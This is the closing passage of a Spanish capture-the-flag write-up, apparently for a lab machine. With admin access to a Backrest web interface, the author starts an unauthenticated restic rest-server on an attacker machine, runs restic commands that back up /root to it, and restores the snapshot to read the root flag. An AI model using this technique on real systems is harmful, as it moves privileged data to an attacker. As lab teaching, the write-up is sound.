<p>Luego accedÃ­ a Ã©l a travÃ©s de:</p>
</li>
<li>
<p><a href="http://localhost:9898">http://localhost:9898</a></p>
</li>
<li>
<p>Detalles de inicio de sesiÃ³n:</p>
</li>
</ul>
<p>Nombre de usuario: backrest_root<br>
ContraseÃ±a: CENSURED</p>
<h3 id="abusar-de-restic-para-el-acceso-root">Abusar de Restic para el acceso root</h3>
<ul>
<li>
<p>Una vez que obtuve acceso de administrador a la interfaz web de Backrest, vi la oportunidad de abusar de su funciÃ³n de restauraciÃ³n para enviar copias de seguridad a un servidor que yo controlaba. Para ello, necesitaba configurar un receptor compatible con Restic.</p>
</li>
<li>
<p>QuÃ© es Backrest (Para restic):</p>
</li>
</ul>
<p><strong>Es una interfaz web + orquestador para la herramienta de backup restic.
Permite crear repositorios de backup, programar backups automÃ¡ticamente, y realizar mantenimientos como â€œpruneâ€, â€œforgetâ€, â€œcheckâ€.
En la interfaz puedes explorar snapshots (versiones guardadas), navegar contenido de backups, y restaurar archivos vÃ­a web.
Ofrece hooks previos o posteriores al backup para ejecutar comandos personalizados.
Compatible con mÃºltiples backend de almacenamiento (local, S3, Azure, rclone, SFTP).
Puede configurarse en Docker, Linux, macOS, Windows.</strong></p>
<ul>
<li>
<p>GTFOBins: <a href="https://gtfobins.github.io/gtfobins/restic/">https://gtfobins.github.io/gtfobins/restic/</a></p>
</li>
<li>
<p>LancÃ© una instancia de servidor Rest en mi mÃ¡quina atacante:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">rest-server</span><span style="color:#BD93F9"> --path</span><span style="color:#F1FA8C"> /tmp/restic-data</span><span style="color:#BD93F9"> --listen</span><span style="color:#F1FA8C"> :12345</span><span style="color:#BD93F9"> --no-auth</span></span></code></pre>
<p>Con el oyente activo, estaba listo para configurar el servicio Backrest del sistema de destino para conectarse a mi mÃ¡quina y volcar datos confidenciales.</p>
<h3 id="creaciÃ³n-de-un-repositorio-en-backrest">CreaciÃ³n de un repositorio en Backrest</h3>
<p>En la interfaz web de Backrest, naveguÃ© a la secciÃ³nÂ <strong>Repositorios</strong>Â y hice clic enÂ <strong>Agregar repositorio</strong>Â .</p>
<ul>
<li>
<p><strong>Nombre:</strong> <code>root_backup</code>.</p>
</li>
<li>
<p><strong>URL del repositorio:</strong>Â <code>/opt/backrest</code></p>
</li>
<li>
<p><strong>ContraseÃ±a:</strong>Â Se puede generar pero se debe recordar o almacenar.</p>
</li>
<li>
<p>DespuÃ©s de crearlo, el nuevo repositorio apareciÃ³ en la pestaÃ±aÂ <strong>Repositorios</strong>Â , lo que confirmÃ³ que se creÃ³ correctamente.</p>
</li>
</ul>
<h3 id="ejecuciÃ³n-de-comandos-restic-para-realizar-copias-de-seguridad-y-restaurar">EjecuciÃ³n de comandos Restic para realizar copias de seguridad y restaurar</h3>
<ul>
<li>
<p>Una vez creado el repositorio en Backrest, hice clic en Ã©l y fui a la pestaÃ±aÂ <strong>Ejecutar comando</strong>Â .</p>
</li>
<li>
<p>A partir de ahÃ­, ejecutÃ© los siguientes pasos en la consola de la aplicacion:</p>
</li>
</ul>
<h3 id="1-inicializar-el-repositorio">1. Inicializar el repositorio</h3>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">-r</span><span style="color:#F1FA8C"> rest:http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">YOUR-I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">:12345/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">repo-nam</span><span style="color:#F8F8F2">e</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> init</span></span></code></pre>
<h4 id="2-copia-de-seguridadrooten-el-destino">2. Copia de seguridadÂ <code>/root</code>en el destino</h4>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">-r</span><span style="color:#F1FA8C"> rest:http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">YOUR-I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">:12345/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">repo-nam</span><span style="color:#F8F8F2">e</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> backup</span><span style="color:#F1FA8C"> /root</span></span></code></pre>
<h3 id="listado-y-restauraciÃ³n-de-la-instantÃ¡nea">Listado y restauraciÃ³n de la instantÃ¡nea</h3>
<p><strong>En la mÃ¡quina atacante: RestauraciÃ³n de una instantÃ¡nea</strong></p>
<ul>
<li>
<p>Con el oyente aÃºn ejecutÃ¡ndose en segundo plano, abrÃ­ una nueva pestaÃ±a de terminal para trabajar con los datos de respaldo.</p>
</li>
<li>
<p>Primero, enumerÃ© todas las instantÃ¡neas disponibles:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">-r</span><span style="color:#F1FA8C"> /tmp/restic-data/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">repo-nam</span><span style="color:#F8F8F2">e</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> snapshots</span></span></code></pre>
<ul>
<li>
<p>Esto me mostrÃ³ cada estado guardado del repositorio, completo con marcas de tiempo e identificaciones.</p>
</li>
<li>
<p>Una vez que tuve la ID de instantÃ¡nea correcta, la restaurÃ© en una carpeta llamadaÂ <code>restore</code>:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">-r</span><span style="color:#F1FA8C"> /tmp/restic-data/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">repo-nam</span><span style="color:#F8F8F2">e</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> restore</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">snapshot-i</span><span style="color:#F8F8F2">d</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> --target</span><span style="color:#F1FA8C"> ./restore</span></span></code></pre>
<h3 id="bandera-raÃ­z">Bandera raÃ­z</h3>
<p>DespuÃ©s de restaurar la copia de seguridad, vea el indicador raÃ­z:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> restore/root/root.txt</span></span></code></pre>
<hr>
<h2 id="ï¸-notas">ğŸ› ï¸ Notas :</h2>
<p>Â¿QuÃ© es Backrest?</p>
<p><strong>Backrest</strong>Â es una interfaz de usuario web (UI) y una herramienta de orquestaciÃ³n para el programa de copias de seguridad de lÃ­nea de comandosÂ <em>Restic</em>. EstÃ¡ diseÃ±ado para simplificar el proceso de copia de seguridad tanto para sistemas interactivos como para sistemas sin interfaz grÃ¡fica (como un servidor domÃ©stico o un NAS).Â </p>
<p>Las caracterÃ­sticas clave de Backrest incluyen:Â </p>
<ul>
<li>
<p><strong>Interfaz web</strong>: Proporciona una interfaz grÃ¡fica intuitiva para crear y gestionar copias de seguridad, examinar instantÃ¡neas y restaurar archivos.</p>
</li>
<li>
<p><strong>OrquestaciÃ³n de copias de seguridad</strong>: Permite a los usuarios configurar calendarios de copias de seguridad, polÃ­ticas de retenciÃ³n y tareas de mantenimiento (comoÂ <code>prune</code>Â yÂ <code>check</code>) sin necesidad de escribir scripts manualmente.</p>
</li>
<li>
<p><strong>Compatibilidad multiplataforma</strong>: Disponible para Linux, macOS, Windows, FreeBSD y Docker.</p>
</li>
<li>
<p><strong>Ganchos de notificaciÃ³n</strong>: Puede enviar notificaciones a travÃ©s de servicios como Discord, Slack y Gotify para eventos de copia de seguridad como Ã©xito o fracaso.</p>
</li>
<li>
<p><strong>Compatibilidad con Restic</strong>: Como es un wrapper ligero, Backrest crea repositorios Restic estÃ¡ndar que se pueden seguir gestionando manualmente a travÃ©s de la herramienta de lÃ­nea de comandos de Restic.</p>
</li>
</ul> </div> <!-- FOOTER DEL ARTÃCULO --> <div class="mt-16 pt-8 border-t border-slate-800 text-center"> <a href="/writeups" class="text-slate-400 hover:text-accentBlue transition-colors">
â† Volver a la lista de writeups
</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
Â© 2025 Angel Corral - Todos los derechos reservados.
</div> </footer> </div> </body></html>